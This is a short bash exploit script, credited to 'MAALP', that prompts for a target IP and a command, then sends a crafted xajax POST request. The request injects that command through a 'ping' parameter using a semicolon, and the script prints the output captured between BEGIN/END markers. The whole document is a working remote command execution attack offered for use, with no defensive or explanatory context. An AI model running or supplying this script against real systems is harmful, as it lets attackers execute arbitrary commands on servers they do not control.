#!/bin/bash

#Author: MAALP
read -p "Enter Your IP:- " IP
read -p  "Enter Your command :- " cmd
OUT=`curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${IP}" | sed -n -e "/BEGIN/,/END/ p" | tail -n +2 | head -n -1`
if [ -z "$OUT" ]
then
echo "Enter Correct Detail" 
else
echo $OUT
fi
